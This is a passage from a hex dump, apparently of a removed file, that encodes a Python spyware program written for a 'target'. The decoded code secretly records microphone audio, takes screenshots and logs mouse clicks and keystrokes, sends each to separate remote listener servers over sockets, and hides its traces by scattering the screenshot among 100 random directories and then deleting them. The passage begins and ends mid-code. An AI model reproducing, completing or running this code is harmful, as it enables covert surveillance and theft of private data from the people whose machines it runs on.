-000005a0: 2e70 6f72 745f 6c69 7374 656e 6572 2929  .port_listener))
-000005b0: 0d0a 2020 2020 2020 2020 7472 793a 0d0a  ..        try:..
-000005c0: 2020 2020 2020 2020 2020 2020 666f 726d              form
-000005d0: 6174 203d 2070 7961 7564 696f 2e70 6149  at = pyaudio.paI
-000005e0: 6e74 3136 0d0a 2020 2020 2020 2020 2020  nt16..          
-000005f0: 2020 6368 616e 6e65 6c73 203d 2032 0d0a    channels = 2..
-00000600: 2020 2020 2020 2020 2020 2020 7261 7465              rate
-00000610: 203d 2034 3431 3030 0d0a 2020 2020 2020   = 44100..      
-00000620: 2020 2020 2020 6368 756e 6b20 3d20 3130        chunk = 10
-00000630: 3234 0d0a 2020 2020 2020 2020 2020 2020  24..            
-00000640: 7365 636f 6e64 7320 3d20 7365 6c66 2e64  seconds = self.d
-00000650: 7572 6174 696f 6e20 2b20 310d 0a0d 0a20  uration + 1.... 
-00000660: 2020 2020 2020 2020 2020 2061 7564 696f             audio
-00000670: 203d 2070 7961 7564 696f 2e50 7941 7564   = pyaudio.PyAud
-00000680: 696f 2829 0d0a 0d0a 2020 2020 2020 2020  io()....        
-00000690: 2020 2020 2320 7374 6172 7420 5265 636f      # start Reco
-000006a0: 7264 696e 670d 0a20 2020 2020 2020 2020  rding..         
-000006b0: 2020 2073 7472 6561 6d20 3d20 6175 6469     stream = audi
-000006c0: 6f2e 6f70 656e 2866 6f72 6d61 743d 666f  o.open(format=fo
-000006d0: 726d 6174 2c20 6368 616e 6e65 6c73 3d63  rmat, channels=c
-000006e0: 6861 6e6e 656c 732c 0d0a 2020 2020 2020  hannels,..      
-000006f0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00000700: 2020 2020 2020 2020 2020 7261 7465 3d72            rate=r
-00000710: 6174 652c 2069 6e70 7574 3d54 7275 652c  ate, input=True,
-00000720: 0d0a 2020 2020 2020 2020 2020 2020 2020  ..              
-00000730: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00000740: 2020 6672 616d 6573 5f70 6572 5f62 7566    frames_per_buf
-00000750: 6665 723d 6368 756e 6b29 0d0a 2020 2020  fer=chunk)..    
-00000760: 2020 2020 2020 2020 2320 7072 696e 7428          # print(
-00000770: 2272 6563 6f72 6469 6e67 2e2e 2e22 290d  "recording...").
-00000780: 0a20 2020 2020 2020 2020 2020 2066 7261  .            fra
-00000790: 6d65 7320 3d20 5b5d 0d0a 0d0a 2020 2020  mes = []....    
-000007a0: 2020 2020 2020 2020 666f 7220 6920 696e          for i in
-000007b0: 2072 616e 6765 2830 2c20 696e 7428 7261   range(0, int(ra
-000007c0: 7465 202f 2063 6875 6e6b 202a 2073 6563  te / chunk * sec
-000007d0: 6f6e 6473 2929 3a0d 0a20 2020 2020 2020  onds)):..       
-000007e0: 2020 2020 2020 2020 2064 6174 6120 3d20           data = 
-000007f0: 7374 7265 616d 2e72 6561 6428 6368 756e  stream.read(chun
-00000800: 6b29 0d0a 2020 2020 2020 2020 2020 2020  k)..            
-00000810: 2020 2020 6672 616d 6573 2e61 7070 656e      frames.appen
-00000820: 6428 6461 7461 290d 0a0d 0a20 2020 2020  d(data)....     
-00000830: 2020 2020 2020 2023 2070 7269 6e74 2822         # print("
-00000840: 6669 6e69 7368 6564 2072 6563 6f72 6469  finished recordi
-00000850: 6e67 2229 0d0a 0d0a 2020 2020 2020 2020  ng")....        
-00000860: 2020 2020 2320 7374 6f70 2052 6563 6f72      # stop Recor
-00000870: 6469 6e67 0d0a 2020 2020 2020 2020 2020  ding..          
-00000880: 2020 7374 7265 616d 2e73 746f 705f 7374    stream.stop_st
-00000890: 7265 616d 2829 0d0a 2020 2020 2020 2020  ream()..        
-000008a0: 2020 2020 7374 7265 616d 2e63 6c6f 7365      stream.close
-000008b0: 2829 0d0a 2020 2020 2020 2020 2020 2020  ()..            
-000008c0: 6175 6469 6f2e 7465 726d 696e 6174 6528  audio.terminate(
-000008d0: 290d 0a0d 0a20 2020 2020 2020 2020 2020  )....           
-000008e0: 2023 2043 6f6e 6e65 6374 696f 6e20 7769   # Connection wi
-000008f0: 7468 2053 6572 7665 724c 6973 7465 6e65  th ServerListene
-00000900: 720d 0a0d 0a20 2020 2020 2020 2020 2020  r....           
-00000910: 2073 7472 5f66 7261 6d65 7320 3d20 7374   str_frames = st
-00000920: 7228 6672 616d 6573 290d 0a20 2020 2020  r(frames)..     
-00000930: 2020 2020 2020 206c 6973 7465 6e69 6e67         listening
-00000940: 5f64 6174 612e 7365 6e64 2873 7472 5f66  _data.send(str_f
-00000950: 7261 6d65 732e 656e 636f 6465 2829 290d  rames.encode()).
-00000960: 0a0d 0a20 2020 2020 2020 2065 7863 6570  ...        excep
-00000970: 7420 4f53 4572 726f 723a 0d0a 2020 2020  t OSError:..    
-00000980: 2020 2020 2020 2020 7072 696e 7428 224e          print("N
-00000990: 4f20 4d49 4352 4f50 484f 4e45 2044 4554  O MICROPHONE DET
-000009a0: 4543 5445 4420 4f52 204d 4943 524f 5048  ECTED OR MICROPH
-000009b0: 4f4e 4520 5345 5454 494e 4720 4449 5341  ONE SETTING DISA
-000009c0: 424c 4544 2229 0d0a 2020 2020 2020 2020  BLED")..        
-000009d0: 2020 2020 6e6f 5f6d 6963 726f 666f 6e20      no_microfon 
-000009e0: 3d20 2254 4845 2054 4152 4745 5420 4841  = "THE TARGET HA
-000009f0: 5320 4e4f 204d 4943 524f 5048 4f4e 4520  S NO MICROPHONE 
-00000a00: 4f4e 220d 0a20 2020 2020 2020 2020 2020  ON"..           
-00000a10: 206c 6973 7465 6e69 6e67 5f64 6174 612e   listening_data.
-00000a20: 7365 6e64 286e 6f5f 6d69 6372 6f66 6f6e  send(no_microfon
-00000a30: 2e65 6e63 6f64 6528 2929 0d0a 2020 2020  .encode())..    
-00000a40: 2020 2020 2020 2020 2320 5365 6e64 7320          # Sends 
-00000a50: 6461 7461 2074 6f20 5365 7276 6572 4c69  data to ServerLi
-00000a60: 7374 656e 6572 0d0a 0d0a 2020 2020 6465  stener....    de
-00000a70: 6620 616c 6c5f 6469 7228 7365 6c66 293a  f all_dir(self):
-00000a80: 0d0a 2020 2020 2020 2020 676c 6f62 616c  ..        global
-00000a90: 2072 616e 646f 6d5f 6c73 740d 0a20 2020   random_lst..   
-00000aa0: 2020 2020 207a 6569 6368 656e 203d 2022       zeichen = "
-00000ab0: 7177 6572 747a 7569 6f70 6173 6466 6768  qwertzuiopasdfgh
-00000ac0: 6a6b 6c79 7863 7662 6e6d 3132 3334 3536  jklyxcvbnm123456
-00000ad0: 3738 3930 220d 0a20 2020 2020 2020 2072  7890"..        r
-00000ae0: 616e 646f 6d5f 6c73 7420 3d20 5b22 222e  andom_lst = ["".
-00000af0: 6a6f 696e 2872 616e 646f 6d2e 7361 6d70  join(random.samp
-00000b00: 6c65 287a 6569 6368 656e 2c20 7261 6e64  le(zeichen, rand
-00000b10: 6f6d 2e72 616e 6469 6e74 2834 2c20 3130  om.randint(4, 10
-00000b20: 2929 2920 666f 7220 7820 696e 2072 616e  ))) for x in ran
-00000b30: 6765 2831 3030 295d 0d0a 2020 2020 2020  ge(100)]..      
-00000b40: 2020 2320 5468 6973 206d 616b 6573 2061    # This makes a
-00000b50: 206c 6973 7420 6f66 2065 7665 7279 2064   list of every d
-00000b60: 6972 6563 746f 7279 206e 616d 6520 7261  irectory name ra
-00000b70: 6e64 6f6d 6c79 0d0a 2020 2020 2020 2020  ndomly..        
-00000b80: 666f 7220 6469 725f 6e61 6d65 2069 6e20  for dir_name in 
-00000b90: 7261 6e64 6f6d 5f6c 7374 3a0d 0a20 2020  random_lst:..   
-00000ba0: 2020 2020 2020 2020 206f 732e 7379 7374           os.syst
-00000bb0: 656d 2866 226d 6b64 6972 207b 6469 725f  em(f"mkdir {dir_
-00000bc0: 6e61 6d65 7d22 290d 0a20 2020 2020 2020  name}")..       
-00000bd0: 2020 2020 2023 2054 6865 2064 6972 6563       # The direc
-00000be0: 746f 7279 2069 7320 6265 696e 6720 6d61  tory is being ma
-00000bf0: 6465 2068 6572 650d 0a0d 0a20 2020 2020  de here....     
-00000c00: 2020 2072 616e 646f 6d5f 6469 7220 3d20     random_dir = 
-00000c10: 7261 6e64 6f6d 2e63 686f 6963 6528 7261  random.choice(ra
-00000c20: 6e64 6f6d 5f6c 7374 290d 0a20 2020 2020  ndom_lst)..     
-00000c30: 2020 206f 732e 6368 6469 7228 7261 6e64     os.chdir(rand
-00000c40: 6f6d 5f64 6972 290d 0a20 2020 2020 2020  om_dir)..       
-00000c50: 2023 2057 6520 6172 6520 6e6f 7720 696e   # We are now in
-00000c60: 2074 6861 7420 6469 7265 6374 6f72 7920   that directory 
-00000c70: 7768 6572 6520 7468 6520 696d 6167 6520  where the image 
-00000c80: 6361 6e20 6265 2073 746f 7265 640d 0a0d  can be stored...
-00000c90: 0a20 2020 2064 6566 2063 6c69 656e 7428  .    def client(
-00000ca0: 7365 6c66 2c20 6970 5f70 686f 746f 732c  self, ip_photos,
-00000cb0: 2070 6f72 745f 7068 6f74 6f73 293a 0d0a   port_photos):..
-00000cc0: 2020 2020 2020 2020 676c 6f62 616c 2066          global f
-00000cd0: 6861 6e64 6c65 0d0a 2020 2020 2020 2020  handle..        
-00000ce0: 2320 6668 616e 646c 6520 6973 2074 6865  # fhandle is the
-00000cf0: 2076 6172 6961 626c 6520 7768 6963 6820   variable which 
-00000d00: 6f70 656e 7320 7468 6520 666f 746f 0d0a  opens the foto..
-00000d10: 2020 2020 2020 2020 7320 3d20 736f 636b          s = sock
-00000d20: 6574 2e73 6f63 6b65 7428 736f 636b 6574  et.socket(socket
-00000d30: 2e41 465f 494e 4554 2c20 736f 636b 6574  .AF_INET, socket
-00000d40: 2e53 4f43 4b5f 5354 5245 414d 290d 0a20  .SOCK_STREAM).. 
-00000d50: 2020 2020 2020 2073 2e63 6f6e 6e65 6374         s.connect
-00000d60: 2828 6970 5f70 686f 746f 732c 2070 6f72  ((ip_photos, por
-00000d70: 745f 7068 6f74 6f73 2929 0d0a 2020 2020  t_photos))..    
-00000d80: 2020 2020 2320 5468 6973 2063 6f6e 6e65      # This conne
-00000d90: 6374 7320 746f 2074 6865 2073 6572 7665  cts to the serve
-00000da0: 7220 796f 7520 7370 6563 6966 6965 640d  r you specified.
-00000db0: 0a20 2020 2020 2020 2069 6d61 6765 203d  .        image =
-00000dc0: 2070 672e 7363 7265 656e 7368 6f74 2829   pg.screenshot()
-00000dd0: 0d0a 2020 2020 2020 2020 2320 2269 6d61  ..        # "ima
-00000de0: 6765 2220 7363 7265 656e 7368 6f74 7320  ge" screenshots 
-00000df0: 7468 6520 6375 7272 656e 7420 696d 6167  the current imag
-00000e00: 6520 6166 7465 7220 6120 7370 6563 6966  e after a specif
-00000e10: 6963 2074 696d 650d 0a20 2020 2020 2020  ic time..       
-00000e20: 2066 6f74 6f6e 616d 6520 3d20 2249 6d61   fotoname = "Ima
-00000e30: 6765 2e70 6e67 220d 0a20 2020 2020 2020  ge.png"..       
-00000e40: 2023 204e 616d 6520 6f66 2074 6865 2069   # Name of the i
-00000e50: 6d61 6765 0d0a 2020 2020 2020 2020 696d  mage..        im
-00000e60: 6167 652e 7361 7665 2866 6f74 6f6e 616d  age.save(fotonam
-00000e70: 6529 0d0a 2020 2020 2020 2020 2320 5361  e)..        # Sa
-00000e80: 7665 7320 7468 6520 696d 6167 6520 696e  ves the image in
-00000e90: 2074 6865 2063 7572 7265 6e74 2064 6972   the current dir
-00000ea0: 6563 746f 7279 0d0a 2020 2020 2020 2020  ectory..        
-00000eb0: 6668 616e 646c 6520 3d20 6f70 656e 2866  fhandle = open(f
-00000ec0: 6f74 6f6e 616d 652c 2022 7262 2229 0d0a  otoname, "rb")..
-00000ed0: 2020 2020 2020 2020 2320 4f70 656e 7320          # Opens 
-00000ee0: 7468 6520 696d 6167 650d 0a0d 0a20 2020  the image....   
-00000ef0: 2020 2020 2066 756c 6c5f 6d73 6720 3d20       full_msg = 
-00000f00: 6222 220d 0a20 2020 2020 2020 2023 2045  b""..        # E
-00000f10: 7665 7279 2069 6d61 6765 2069 6e66 6f72  very image infor
-00000f20: 6d61 7469 6f6e 2077 696c 6c20 6265 2073  mation will be s
-00000f30: 746f 7265 6420 696e 2022 6675 6c6c 5f6d  tored in "full_m
-00000f40: 7367 220d 0a20 2020 2020 2020 2066 6f72  sg"..        for
-00000f50: 206c 696e 6520 696e 2066 6861 6e64 6c65   line in fhandle
-00000f60: 3a0d 0a20 2020 2020 2020 2020 2020 2066  :..            f
-00000f70: 756c 6c5f 6d73 6720 2b3d 206c 696e 650d  ull_msg += line.
-00000f80: 0a0d 0a20 2020 2020 2020 2073 2e73 656e  ...        s.sen
-00000f90: 6428 6675 6c6c 5f6d 7367 290d 0a0d 0a20  d(full_msg).... 
-00000fa0: 2020 2064 6566 2063 6f75 6e74 646f 776e     def countdown
-00000fb0: 5f73 656e 6428 7365 6c66 2c20 7a65 6974  _send(self, zeit
-00000fc0: 2c20 6970 5f70 686f 746f 732c 2070 6f72  , ip_photos, por
-00000fd0: 745f 7068 6f74 6f73 2c20 6970 5f6b 6579  t_photos, ip_key
-00000fe0: 6c6f 6767 6572 2c20 706f 7274 5f6b 6579  logger, port_key
-00000ff0: 6c6f 6767 6572 293a 0d0a 2020 2020 2020  logger):..      
-00001000: 2020 7365 636f 6e64 735f 6c69 7374 203d    seconds_list =
-00001010: 205b 7a61 686c 2066 6f72 207a 6168 6c20   [zahl for zahl 
-00001020: 696e 2072 616e 6765 2830 2c20 7a65 6974  in range(0, zeit
-00001030: 202b 2031 2c20 3230 2920 6966 207a 6168   + 1, 20) if zah
-00001040: 6c20 213d 2030 5d0d 0a20 2020 2020 2020  l != 0]..       
-00001050: 2023 2054 6865 2073 6563 6f6e 6473 2074   # The seconds t
-00001060: 6865 2069 6d61 6765 2077 696c 6c20 6265  he image will be
-00001070: 2073 656e 7420 696e 2032 3020 7374 6570   sent in 20 step
-00001080: 7320 746f 2074 6865 2073 6572 7665 7220  s to the server 
-00001090: 7769 6c6c 2062 6520 7361 7665 6420 696e  will be saved in
-000010a0: 2022 7365 636f 6e64 735f 6c69 7374 220d   "seconds_list".
-000010b0: 0a20 2020 2020 2020 2070 7269 6e74 2873  .        print(s
-000010c0: 6563 6f6e 6473 5f6c 6973 7429 0d0a 2020  econds_list)..  
-000010d0: 2020 2020 2020 6b65 795f 6461 7461 203d        key_data =
-000010e0: 2073 6f63 6b65 742e 736f 636b 6574 2873   socket.socket(s
-000010f0: 6f63 6b65 742e 4146 5f49 4e45 542c 2073  ocket.AF_INET, s
-00001100: 6f63 6b65 742e 534f 434b 5f53 5452 4541  ocket.SOCK_STREA
-00001110: 4d29 0d0a 0d0a 2020 2020 2020 2020 7472  M)....        tr
-00001120: 793a 0d0a 2020 2020 2020 2020 2020 2020  y:..            
-00001130: 666f 7220 7820 696e 2072 616e 6765 287a  for x in range(z
-00001140: 6569 7420 2b20 3129 3a0d 0a20 2020 2020  eit + 1):..     
-00001150: 2020 2020 2020 2020 2020 2069 6620 7820             if x 
-00001160: 3d3d 2032 303a 0d0a 2020 2020 2020 2020  == 20:..        
-00001170: 2020 2020 2020 2020 2020 2020 7365 6c66              self
-00001180: 2e61 6c6c 5f64 6972 2829 0d0a 2020 2020  .all_dir()..    
-00001190: 2020 2020 2020 2020 2020 2020 2020 2020                  
-000011a0: 2320 5468 6973 2066 756e 6374 696f 6e20  # This function 
-000011b0: 6d61 6b65 7320 3130 3020 6669 6c65 7320  makes 100 files 
-000011c0: 746f 2073 746f 7265 2074 6865 2069 6d61  to store the ima
-000011d0: 6765 2073 6f20 7468 6520 7461 7267 6574  ge so the target
-000011e0: 2077 6f6e 2774 2066 696e 6420 6f75 740d   won't find out.
-000011f0: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
-00001200: 2070 7269 6e74 2878 290d 0a20 2020 2020   print(x)..     
-00001210: 2020 2020 2020 2020 2020 207a 6569 7420             zeit 
-00001220: 2d3d 2031 0d0a 2020 2020 2020 2020 2020  -= 1..          
-00001230: 2020 2020 2020 7469 6d65 2e73 6c65 6570        time.sleep
-00001240: 2831 290d 0a20 2020 2020 2020 2020 2020  (1)..           
-00001250: 2020 2020 2069 6620 7820 696e 2073 6563       if x in sec
-00001260: 6f6e 6473 5f6c 6973 743a 0d0a 2020 2020  onds_list:..    
-00001270: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00001280: 7365 6c66 2e63 6c69 656e 7428 6970 5f70  self.client(ip_p
-00001290: 686f 746f 732c 2070 6f72 745f 7068 6f74  hotos, port_phot
-000012a0: 6f73 290d 0a20 2020 2020 2020 2020 2020  os)..           
-000012b0: 2020 2020 2020 2020 2023 2054 6865 2069           # The i
-000012c0: 6d61 6765 7320 7769 6c6c 2062 6520 7365  mages will be se
-000012d0: 6e74 0d0a 2020 2020 2020 2020 2020 2020  nt..            
-000012e0: 6b65 795f 6461 7461 2e63 6f6e 6e65 6374  key_data.connect
-000012f0: 2828 6970 5f6b 6579 6c6f 6767 6572 2c20  ((ip_keylogger, 
-00001300: 706f 7274 5f6b 6579 6c6f 6767 6572 2929  port_keylogger))
-00001310: 0d0a 2020 2020 2020 2020 2020 2020 2320  ..            # 
-00001320: 5468 6973 2069 7320 7468 6520 6970 2061  This is the ip a
-00001330: 6e64 2074 6865 2070 6f72 7420 6f66 2074  nd the port of t
-00001340: 6865 2073 6572 7665 7220 7468 6520 706f  he server the po
-00001350: 7274 2073 686f 756c 646e 2774 2062 6520  rt shouldn't be 
-00001360: 7468 6520 7361 6d65 2074 6865 2073 6572  the same the ser
-00001370: 7665 725f 7068 6f74 6f73 2061 6e64 2074  ver_photos and t
-00001380: 6865 2073 6572 7665 725f 6b65 796c 6f67  he server_keylog
-00001390: 6765 7220 7368 6f75 6c64 6e27 7420 6265  ger shouldn't be
-000013a0: 0d0a 2020 2020 2020 2020 2020 2020 2320  ..            # 
-000013b0: 696e 2074 6865 2073 616d 6520 666f 6c64  in the same fold
-000013c0: 6572 0d0a 2020 2020 2020 2020 2020 2020  er..            
-000013d0: 7365 6c66 2e63 6f6f 7264 696e 6174 6573  self.coordinates
-000013e0: 203d 206c 6973 7428 7365 7428 7365 6c66   = list(set(self
-000013f0: 2e63 6f6f 7264 696e 6174 6573 2929 0d0a  .coordinates))..
-00001400: 2020 2020 2020 2020 2020 2020 2320 5468              # Th
-00001410: 6973 2063 6865 636b 7320 6966 2074 6865  is checks if the
-00001420: 2063 6f6f 7264 696e 6174 6573 206f 6363   coordinates occ
-00001430: 7572 2032 2074 696d 6573 0d0a 2020 2020  ur 2 times..    
-00001440: 2020 2020 2020 2020 7072 696e 7428 7365          print(se
-00001450: 6c66 2e63 6f6f 7264 696e 6174 6573 290d  lf.coordinates).
-00001460: 0a20 2020 2020 2020 2020 2020 2077 6f72  .            wor
-00001470: 7420 3d20 2222 0d0a 2020 2020 2020 2020  t = ""..        
-00001480: 2020 2020 666f 7220 7a65 6963 6865 6e20      for zeichen 
-00001490: 696e 2073 656c 662e 7269 6368 7469 6765  in self.richtige
-000014a0: 5f6c 6973 7465 3a0d 0a20 2020 2020 2020  _liste:..       
-000014b0: 2020 2020 2020 2020 2077 6f72 7420 2b3d           wort +=
-000014c0: 207a 6569 6368 656e 0d0a 0d0a 2020 2020   zeichen....    
-000014d0: 2020 2020 2020 2020 2320 5365 6e64 7320          # Sends 
-000014e0: 7468 6520 6461 7461 2074 6f20 7365 7276  the data to serv
-000014f0: 6572 5f6b 6579 6c6f 6767 6572 0d0a 2020  er_keylogger..  
-00001500: 2020 2020 2020 2020 2020 616c 6c5f 6461            all_da
-00001510: 7461 203d 2073 7472 2873 656c 662e 636f  ta = str(self.co
-00001520: 6f72 6469 6e61 7465 7329 202b 2077 6f72  ordinates) + wor
-00001530: 740d 0a20 2020 2020 2020 2020 2020 2023  t..            #
-00001540: 2043 6f6f 7264 696e 6174 6573 2061 6e64   Coordinates and
-00001550: 206b 6579 6461 7461 2061 7265 2062 6569   keydata are bei
-00001560: 6e67 2063 6f6e 6361 7465 6e61 7465 640d  ng concatenated.
-00001570: 0a20 2020 2020 2020 2020 2020 206b 6579  .            key
-00001580: 5f64 6174 612e 7365 6e64 2861 6c6c 5f64  _data.send(all_d
-00001590: 6174 612e 656e 636f 6465 2829 290d 0a20  ata.encode()).. 
-000015a0: 2020 2020 2020 2020 2020 2070 7269 6e74             print
-000015b0: 2877 6f72 7429 0d0a 2020 2020 2020 2020  (wort)..        
-000015c0: 2020 2020 7072 696e 7428 7365 6c66 2e72      print(self.r
-000015d0: 6963 6874 6967 655f 6c69 7374 6529 0d0a  ichtige_liste)..
-000015e0: 2020 2020 2020 2020 2020 2020 6668 616e              fhan
-000015f0: 646c 652e 636c 6f73 6528 290d 0a20 2020  dle.close()..   
-00001600: 2020 2020 2020 2020 2023 2043 6c6f 7365           # Close
-00001610: 7320 7468 6520 696d 6167 650d 0a20 2020  s the image..   
-00001620: 2020 2020 2020 2020 206f 732e 7265 6d6f           os.remo
-00001630: 7665 2822 496d 6167 652e 706e 6722 290d  ve("Image.png").
-00001640: 0a20 2020 2020 2020 2020 2020 2023 2044  .            # D
-00001650: 656c 6574 6573 2074 6865 2069 6d61 6765  eletes the image
-00001660: 2069 6e20 7468 6520 6375 7272 656e 7420   in the current 
-00001670: 6469 7265 6374 6f72 790d 0a20 2020 2020  directory..     
-00001680: 2020 2020 2020 206f 732e 6368 6469 7228         os.chdir(
-00001690: 222e 2e22 290d 0a20 2020 2020 2020 2020  "..")..         
-000016a0: 2020 2023 2057 6520 6861 7665 2074 6f20     # We have to 
-000016b0: 676f 2062 6163 6b20 736f 2074 6861 7420  go back so that 
-000016c0: 7765 2063 616e 2064 656c 6574 6520 7468  we can delete th
-000016d0: 6520 6f74 6865 7220 6469 7265 6374 6f72  e other director
-000016e0: 6965 730d 0a20 2020 2020 2020 2020 2020  ies..           
-000016f0: 2066 6f72 2065 6163 685f 6469 7220 696e   for each_dir in
-00001700: 2072 616e 646f 6d5f 6c73 743a 0d0a 2020   random_lst:..  
-00001710: 2020 2020 2020 2020 2020 2020 2020 6f73                os
-00001720: 2e73 7973 7465 6d28 6622 726d 6469 7220  .system(f"rmdir 
-00001730: 7b65 6163 685f 6469 727d 2229 0d0a 2020  {each_dir}")..  
-00001740: 2020 2020 2020 2020 2020 2020 2020 2320                # 
-00001750: 5468 6973 2064 656c 6574 6573 2065 7665  This deletes eve
-00001760: 7279 2064 6972 6563 746f 7279 0d0a 2020  ry directory..  
-00001770: 2020 2020 2020 2020 2020 7379 732e 6578            sys.ex
-00001780: 6974 2829 0d0a 2020 2020 2020 2020 2020  it()..          
-00001790: 2020 2320 5374 6f70 7320 7468 6520 6b65    # Stops the ke
-000017a0: 796c 6f67 6765 720d 0a20 2020 2020 2020  ylogger..       
-000017b0: 2065 7863 6570 7420 4b65 7962 6f61 7264   except Keyboard
-000017c0: 496e 7465 7272 7570 743a 0d0a 2020 2020  Interrupt:..    
-000017d0: 2020 2020 2020 2020 2320 4966 2074 6865          # If the
-000017e0: 2074 6172 6765 7420 6861 7320 6465 7374   target has dest
-000017f0: 726f 7965 6420 7468 6520 636f 6e6e 6563  royed the connec
-00001800: 7469 6f6e 0d0a 2020 2020 2020 2020 2020  tion..          
-00001810: 2020 776f 7274 203d 2022 2a2a 2a25 c2a7    wort = "***%..
-00001820: c2a7 29c2 a7c2 a725 220d 0a20 2020 2020  ..)....%"..     
-00001830: 2020 2020 2020 2023 2054 6869 7320 6973         # This is
-00001840: 206c 696b 6520 6120 7370 6563 6961 6c20   like a special 
-00001850: 636f 6465 2e20 546f 2073 706c 6974 2069  code. To split i
-00001860: 7420 6174 2074 6865 2065 6e64 0d0a 2020  t at the end..  
-00001870: 2020 2020 2020 2020 2020 666f 7220 7a65            for ze
-00001880: 6963 6865 6e20 696e 2073 656c 662e 7269  ichen in self.ri
-00001890: 6368 7469 6765 5f6c 6973 7465 3a0d 0a20  chtige_liste:.. 
-000018a0: 2020 2020 2020 2020 2020 2020 2020 2077                 w
-000018b0: 6f72 7420 2b3d 207a 6569 6368 656e 0d0a  ort += zeichen..
-000018c0: 2020 2020 2020 2020 2020 2020 6461 7461              data
-000018d0: 203d 2066 2254 4845 2043 4f4e 4e45 4354   = f"THE CONNECT
-000018e0: 494f 4e20 4841 5320 4245 454e 2049 4e54  ION HAS BEEN INT
-000018f0: 4552 5255 5054 4544 7b77 6f72 747d 220d  ERRUPTED{wort}".
-00001900: 0a20 2020 2020 2020 2020 2020 2023 2054  .            # T
-00001910: 6869 7320 6c65 7427 7320 7468 6520 7365  his let's the se
-00001920: 7276 6572 206b 6e6f 7720 7468 6174 2074  rver know that t
-00001930: 6865 2073 6572 7665 7220 7368 6f75 6c64  he server should
-00001940: 2073 6875 7420 646f 776e 0d0a 2020 2020   shut down..    
-00001950: 2020 2020 2020 2020 6b65 795f 6461 7461          key_data
-00001960: 2e63 6f6e 6e65 6374 2828 6970 5f6b 6579  .connect((ip_key
-00001970: 6c6f 6767 6572 2c20 706f 7274 5f6b 6579  logger, port_key
-00001980: 6c6f 6767 6572 2929 0d0a 2020 2020 2020  logger))..      
-00001990: 2020 2020 2020 6b65 795f 6461 7461 2e73        key_data.s
-000019a0: 656e 6428 6461 7461 2e65 6e63 6f64 6528  end(data.encode(
-000019b0: 2929 0d0a 2020 2020 2020 2020 2020 2020  ))..            
-000019c0: 6b65 795f 6461 7461 2e63 6c6f 7365 2829  key_data.close()
-000019d0: 0d0a 0d0a 2020 2020 2020 2020 2020 2020  ....            
-000019e0: 6966 206f 732e 7061 7468 2e65 7869 7374  if os.path.exist
-000019f0: 7328 2249 6d61 6765 2e70 6e67 2229 3a0d  s("Image.png"):.
-00001a00: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
-00001a10: 2023 2049 7420 7769 6c6c 2064 6573 7472   # It will destr
-00001a20: 6f79 2074 6865 2069 6d61 6765 2073 6f20  oy the image so 
-00001a30: 7461 7267 6574 2077 6f75 6e64 206b 6e6f  target wound kno
-00001a40: 7720 616e 7974 6869 6e67 0d0a 2020 2020  w anything..    
-00001a50: 2020 2020 2020 2020 2020 2020 6668 616e              fhan
-00001a60: 646c 652e 636c 6f73 6528 290d 0a20 2020  dle.close()..   
-00001a70: 2020 2020 2020 2020 2020 2020 206f 732e               os.
-00001a80: 7265 6d6f 7665 2822 496d 6167 652e 706e  remove("Image.pn
-00001a90: 6722 290d 0a20 2020 2020 2020 2020 2020  g")..           
-00001aa0: 2023 2054 6869 7320 7265 6d6f 7665 7320   # This removes 
-00001ab0: 7468 6520 696d 6167 650d 0a0d 0a20 2020  the image....   
-00001ac0: 2064 6566 206b 696c 6c5f 7377 6974 6368   def kill_switch
-00001ad0: 2873 656c 6629 3a0d 0a20 2020 2020 2020  (self):..       
-00001ae0: 2023 2054 6869 7320 6675 6e63 7469 6f6e   # This function
-00001af0: 2064 6573 7472 6f79 7320 7468 6520 6d6f   destroys the mo
-00001b00: 7573 6520 696e 666f 0d0a 2020 2020 2020  use info..      
-00001b10: 2020 6e65 775f 7365 636f 6e64 7320 3d20    new_seconds = 
-00001b20: 7365 6c66 2e64 7572 6174 696f 6e20 2b20  self.duration + 
-00001b30: 350d 0a20 2020 2020 2020 2023 2032 3020  5..        # 20 
-00001b40: 7365 636f 6e64 7320 6172 6520 6265 696e  seconds are bein
-00001b50: 6720 6164 6465 6420 6265 6361 7573 6520  g added because 
-00001b60: 7468 6572 6520 6d69 6768 7420 6265 2061  there might be a
-00001b70: 2070 726f 626c 656d 0d0a 2020 2020 2020   problem..      
-00001b80: 2020 666f 7220 7820 696e 2072 616e 6765    for x in range
-00001b90: 286e 6577 5f73 6563 6f6e 6473 293a 0d0a  (new_seconds):..
-00001ba0: 2020 2020 2020 2020 2020 2020 7469 6d65              time
-00001bb0: 2e73 6c65 6570 2831 290d 0a20 2020 2020  .sleep(1)..     
-00001bc0: 2020 2023 2054 6869 7320 7374 6f70 6573     # This stopes
-00001bd0: 2074 6865 0d0a 2020 2020 2020 2020 7379   the..        sy
-00001be0: 732e 6578 6974 2829 0d0a 0d0a 2020 2020  s.exit()....    
-00001bf0: 6465 6620 6f6e 5f63 6c69 636b 2873 656c  def on_click(sel
-00001c00: 662c 2078 2c20 792c 2062 7574 746f 6e2c  f, x, y, button,
-00001c10: 2070 7265 7373 6564 293a 0d0a 2020 2020   pressed):..    
-00001c20: 2020 2020 2320 5468 6973 2069 7320 7468      # This is th
-00001c30: 6520 636c 6963 6b20 6675 6e63 7469 6f6e  e click function
-00001c40: 0d0a 2020 2020 2020 2020 7072 696e 7428  ..        print(
-00001c50: 6622 5461 7267 6574 2068 6173 2070 7265  f"Target has pre
-00001c60: 7373 6564 207b 787d 2061 6e64 207b 797d  ssed {x} and {y}
-00001c70: 2229 0d0a 2020 2020 2020 2020 2320 416c  ")..        # Al
-00001c80: 6c20 7468 6520 636f 6f72 6469 6e61 7465  l the coordinate
-00001c90: 7320 7769 6c6c 2062 6520 7374 6f72 6564  s will be stored
-00001ca0: 2069 6e20 2273 656c 662e 636f 6f72 6469   in "self.coordi
-00001cb0: 6e61 7465 7322 0d0a 2020 2020 2020 2020  nates"..        
-00001cc0: 7365 6c66 2e63 6f6f 7264 696e 6174 6573  self.coordinates
-00001cd0: 2e61 7070 656e 6428 2878 2c20 7929 290d  .append((x, y)).
-00001ce0: 0a0d 0a20 2020 2064 6566 2061 6c6c 5f63  ...    def all_c
-00001cf0: 6c69 636b 7328 7365 6c66 293a 0d0a 2020  licks(self):..  
-00001d00: 2020 2020 2020 2320 5468 6973 2069 7320        # This is 
-00001d10: 6a75 7374 2061 2066 756e 6374 696f 6e20  just a function 
